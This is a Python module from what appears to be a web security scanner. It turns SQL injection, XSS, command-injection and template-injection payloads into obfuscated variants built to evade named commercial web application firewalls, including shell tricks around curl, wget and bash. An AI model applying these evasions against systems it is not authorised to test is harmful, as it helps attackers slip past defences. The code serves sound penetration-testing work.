"""
Kryx PayloadMutator - Block 3

WAF-bypass payload variants for all injection probe categories.

When a WAF is detected (is_waf_bypass_active()), probes call get_variants()
to expand their payload list with obfuscated variants — the same approach as
sqlmap tamper scripts, implemented natively.

Techniques per category
  SQLi  : space2comment, randomcase, versioned_comment, hex_encode,
           comment_split, equaltolike, between, inline_comment_paren,
           chardoubleencode
  XSS   : case_variation, null_byte, double_urlencode, html_entities,
           js_unicode, svg_attr_variation
  CMDi  : ifs_replace, brace_expand, wildcard_glob, hex_cmd, dollar_at
  SSTI  : url_encode, unicode_brace, comment_break, mixed_brace

No hardcoded secrets. No network calls. Pure string transforms.
"""
import random
import re
import string
from urllib.parse import quote, quote_plus

# ---------------------------------------------------------------------------
# SQLi tamper functions
# ---------------------------------------------------------------------------

_SQL_KW = re.compile(
    r"\b(SELECT|FROM|WHERE|UNION|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|"
    r"TABLE|DATABASE|SCHEMA|AND|OR|NOT|NULL|IS|IN|LIKE|BETWEEN|ORDER|GROUP|"
    r"HAVING|LIMIT|OFFSET|CAST|CONVERT|CHAR|CONCAT|IF|CASE|WHEN|THEN|ELSE|"
    r"END|EXISTS|ALL|ANY|JOIN|ON|AS|BY|ASC|DESC|EXEC|EXECUTE|SLEEP|BENCHMARK|"
    r"INFORMATION_SCHEMA|VERSION|USER|DATABASE)\b",
    re.IGNORECASE,
)


def space2comment(p: str) -> str:
    """Replace spaces with /**/ — bypasses most signature-based WAFs."""
    return p.replace(" ", "/**/")


def randomcase(p: str) -> str:
    """Randomize SQL keyword case: SELECT → SeLeCt."""
    def _rand(m):
        w = m.group(0)
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in w)
    return _SQL_KW.sub(_rand, p)


def versioned_comment(p: str) -> str:
    """Wrap SQL keywords in MySQL versioned comments: /*!50000SELECT*/."""
    def _wrap(m):
        return f"/*!50000{m.group(0).upper()}*/"
    return _SQL_KW.sub(_wrap, p)


def comment_split(p: str) -> str:
    """Split keywords by inserting inline comments: SE/**/LECT."""
    def _split(m):
        w = m.group(0)
        if len(w) < 4:
            return w
        mid = len(w) // 2
        return w[:mid] + "/**/" + w[mid:]
    return _SQL_KW.sub(_split, p)


def equaltolike(p: str) -> str:
    """Replace = with LIKE (MySQL/MSSQL): 1=1 → 1 LIKE 1."""
    return re.sub(r"(?<![<>!])=(?!=)", " LIKE ", p)


def between_replace(p: str) -> str:
    """Replace > 0 with NOT BETWEEN 0 AND 0, > 1 with NOT BETWEEN 0 AND 1."""
    def _sub(m):
        val = m.group(1).strip()
        return f" NOT BETWEEN 0 AND {val}"
    return re.sub(r"\s*>\s*(\d+)", _sub, p)


def inline_comment_paren(p: str) -> str:
    """Insert comment before opening parens: (SELECT → /**/(SELECT."""
    return p.replace("(", "/**/(")


def chardoubleencode(p: str) -> str:
    """Double URL-encode the payload: %27 → %2527."""
    return quote(p, safe="")


def hex_encode_strings(p: str) -> str:
    """Encode single-quoted string literals as hex: 'abc' → 0x616263."""
    def _hex(m):
        content = m.group(1)
        return "0x" + content.encode().hex()
    return re.sub(r"'([^']*)'", _hex, p)


def add_null_union(p: str) -> str:
    """Add NULL padding to UNION SELECT: UNION SELECT 1 → UNION SELECT NULL,1,NULL."""
    if "UNION SELECT" not in p.upper():
        return p
    return re.sub(
        r"(?i)(UNION\s+SELECT)\s+(\d+)",
        lambda m: f"{m.group(1)} NULL,{m.group(2)},NULL",
        p,
    )


# ---------------------------------------------------------------------------
# XSS tamper functions
# ---------------------------------------------------------------------------

def xss_case_variation(p: str) -> str:
    """Randomize HTML tag casing: <script> → <ScRiPt>."""
    def _rand_case(m):
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0))
    return re.sub(r"</?[a-zA-Z][a-zA-Z0-9]*", _rand_case, p)


def xss_null_byte(p: str) -> str:
    """Insert null byte inside tag name: <script> → <sc%00ript>."""
    return re.sub(r"<([a-zA-Z]{3,})", lambda m: f"<{m.group(1)[:2]}%00{m.group(1)[2:]}", p)


def xss_double_urlencode(p: str) -> str:
    """Double URL-encode the whole payload."""
    return quote(quote(p, safe=""), safe="")


def xss_html_entities(p: str) -> str:
    """Encode < and > as HTML decimal entities."""
    return p.replace("<", "&#60;").replace(">", "&#62;")


def xss_js_unicode(p: str) -> str:
    """Unicode-escape < and > for JS contexts."""
    return p.replace("<", "\\u003c").replace(">", "\\u003e").replace('"', "\\u0022").replace("'", "\\u0027")


def xss_svg_variation(p: str) -> str:
    """Alternate SVG-based payloads: <svg onload=... autofocus>."""
    if "onload" in p.lower():
        return re.sub(r"<svg[^>]*/?>", "<svg autofocus onfocus=", p, flags=re.I) + " autofocus>"
    return p


def xss_backtick_handler(p: str) -> str:
    """Replace () with `` in JS calls for certain WAF bypass: alert(1) → alert`1`."""
    return re.sub(r"(\w+)\(([^)]*)\)", lambda m: f"{m.group(1)}`{m.group(2)}`", p)


# ---------------------------------------------------------------------------
# CMDi tamper functions
# ---------------------------------------------------------------------------

def cmdi_ifs_replace(p: str) -> str:
    """Replace spaces with ${IFS} — works in bash/sh without quotes."""
    return p.replace(" ", "${IFS}")


def cmdi_dollar_at(p: str) -> str:
    """Insert $@ into command names to confuse simple pattern matching."""
    return re.sub(r"\b(cat|id|ls|whoami|echo|curl|wget|bash|sh)\b",
                  lambda m: m.group(0)[0] + "$@" + m.group(0)[1:], p)


def cmdi_brace_expand(p: str) -> str:
    """Wrap command in brace expansion: id → {id,}."""
    return re.sub(r"\b(cat|id|ls|whoami|echo|curl|wget|bash|sh)\b",
                  lambda m: "{" + m.group(0) + ",}", p)


def cmdi_hex_cmd(p: str) -> str:
    """Hex-encode the main command word: cat → $'\x63\x61\x74'."""
    def _hex(m):
        cmd = m.group(0)
        escaped = "".join(f"\\x{ord(c):02x}" for c in cmd)
        return f"$'{escaped}'"
    return re.sub(r"\b(cat|id|ls|whoami|echo|curl|wget|bash|sh)\b", _hex, p)


def cmdi_wildcard_glob(p: str) -> str:
    """Replace middle of command with glob: cat → ca? or /bin/cat → /b?n/c?t."""
    return re.sub(r"\b(cat|bash|curl|wget)\b",
                  lambda m: m.group(0)[:-1] + "?", p)


# ---------------------------------------------------------------------------
# SSTI tamper functions
# ---------------------------------------------------------------------------

def ssti_urlencode(p: str) -> str:
    """URL-encode the full payload."""
    return quote(p, safe="")


def ssti_unicode_brace(p: str) -> str:
    """Replace {{ with \\u007b\\u007b and }} with \\u007d\\u007d."""
    return p.replace("{{", "\\u007b\\u007b").replace("}}", "\\u007d\\u007d")


def ssti_comment_break(p: str) -> str:
    """Break {{ with a comment: {#c#}{ for Jinja2 bypass."""
    return p.replace("{{", "{#c#}{" ).replace("}}", "}{#c#}")


def ssti_mixed_brace(p: str) -> str:
    """Mix brace styles to confuse regex rules."""
    return p.replace("{{", "{%25{").replace("}}", "}%25}")


# ---------------------------------------------------------------------------
# WAF-specific tamper chains
# Each chain is a list of (tamper_fn, weight) — higher weight = applied first.
# ---------------------------------------------------------------------------

_SQLI_CHAINS: dict[str, list] = {
    "cloudflare": [
        space2comment, randomcase, versioned_comment, inline_comment_paren,
        equaltolike, between_replace,
    ],
    "modsecurity": [
        space2comment, comment_split, versioned_comment, chardoubleencode,
        hex_encode_strings, inline_comment_paren,
    ],
    "akamai": [
        chardoubleencode, space2comment, randomcase, hex_encode_strings,
        inline_comment_paren,
    ],
    "imperva": [
        space2comment, versioned_comment, chardoubleencode, comment_split,
        equaltolike,
    ],
    "aws_waf": [
        randomcase, space2comment, chardoubleencode, inline_comment_paren,
        hex_encode_strings,
    ],
    "generic": [
        space2comment, randomcase, versioned_comment, chardoubleencode,
        inline_comment_paren, comment_split,
    ],
}

_XSS_CHAINS: dict[str, list] = {
    "cloudflare": [
        xss_case_variation, xss_null_byte, xss_double_urlencode,
        xss_backtick_handler, xss_svg_variation,
    ],
    "modsecurity": [
        xss_html_entities, xss_double_urlencode, xss_case_variation,
        xss_null_byte,
    ],
    "akamai": [
        xss_double_urlencode, xss_js_unicode, xss_case_variation,
        xss_null_byte,
    ],
    "generic": [
        xss_case_variation, xss_null_byte, xss_double_urlencode,
        xss_html_entities, xss_js_unicode, xss_backtick_handler,
    ],
}

_CMDI_CHAINS: dict[str, list] = {
    "cloudflare": [cmdi_ifs_replace, cmdi_brace_expand, cmdi_dollar_at],
    "modsecurity": [cmdi_ifs_replace, cmdi_hex_cmd, cmdi_wildcard_glob, cmdi_dollar_at],
    "akamai":     [cmdi_hex_cmd, cmdi_ifs_replace, cmdi_brace_expand],
    "generic":    [cmdi_ifs_replace, cmdi_brace_expand, cmdi_dollar_at,
                   cmdi_hex_cmd, cmdi_wildcard_glob],
}

_SSTI_CHAINS: dict[str, list] = {
    "cloudflare": [ssti_urlencode, ssti_comment_break, ssti_mixed_brace],
    "modsecurity": [ssti_urlencode, ssti_unicode_brace, ssti_comment_break],
    "akamai":     [ssti_urlencode, ssti_unicode_brace],
    "generic":    [ssti_urlencode, ssti_comment_break, ssti_unicode_brace,
                   ssti_mixed_brace],
}

_CHAINS_BY_CATEGORY: dict[str, dict] = {
    "sqli":  _SQLI_CHAINS,
    "xss":   _XSS_CHAINS,
    "cmdi":  _CMDI_CHAINS,
    "ssti":  _SSTI_CHAINS,
    "lfi":   _SQLI_CHAINS,     # LFI uses same encoding tricks as SQLi
    "generic": {"generic": [space2comment, chardoubleencode, randomcase]},
}

# Max variants to return (prevent probe from sending 100 requests)
_MAX_VARIANTS = 12


def mutate(payload: str, category: str, waf_name: str = "generic") -> list[str]:
    """Apply WAF-specific tamper chain to a single payload.

    Returns the original payload plus up to _MAX_VARIANTS mutated copies,
    deduped, with the original always first.
    """
    cat_chains = _CHAINS_BY_CATEGORY.get(category, _CHAINS_BY_CATEGORY["generic"])
    chain = cat_chains.get(waf_name.lower()) or cat_chains.get("generic", [])

    seen: set[str] = {payload}
    variants: list[str] = [payload]

    for fn in chain:
        try:
            v = fn(payload)
            if v and v not in seen:
                seen.add(v)
                variants.append(v)
        except Exception:
            pass

    # Also try pairwise combinations of the two most effective tampers
    if len(chain) >= 2:
        for i, fn1 in enumerate(chain[:4]):
            for fn2 in chain[i + 1:5]:
                try:
                    v = fn2(fn1(payload))
                    if v and v not in seen and len(variants) < _MAX_VARIANTS:
                        seen.add(v)
                        variants.append(v)
                except Exception:
                    pass

    return variants[:_MAX_VARIANTS]


def get_variants(
    payloads: list[str],
    category: str,
    waf_name: str = "generic",
    active: bool | None = None,
) -> list[str]:
    """Expand a payload list with WAF-bypass variants.

    When `active` is None, auto-detects via auth_context.is_waf_bypass_active().
    If WAF bypass is not active, returns the original list unchanged — zero overhead
    on non-WAF scans.

    Args:
        payloads: Base payload list from the probe.
        category: "sqli" | "xss" | "cmdi" | "ssti" | "lfi" | "generic"
        waf_name: WAF name string from WafContext (e.g. "cloudflare").
        active:   Force bypass on/off; None = auto-detect.

    Returns:
        Deduped list: original payloads first, then unique mutated variants.
    """
    if active is None:
        try:
            from core.harness.auth_context import is_waf_bypass_active
            from core.harness.waf_detector import _last_waf_name
            active = is_waf_bypass_active()
            if active and waf_name == "generic":
                try:
                    waf_name = _last_waf_name() or "generic"
                except Exception:
                    pass
        except ImportError:
            active = False

    if not active:
        return list(payloads)

    seen: set[str] = set()
    result: list[str] = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            result.append(p)

    for p in payloads:
        for variant in mutate(p, category, waf_name):
            if variant not in seen and len(result) < _MAX_VARIANTS * len(payloads):
                seen.add(variant)
                result.append(variant)

    return result
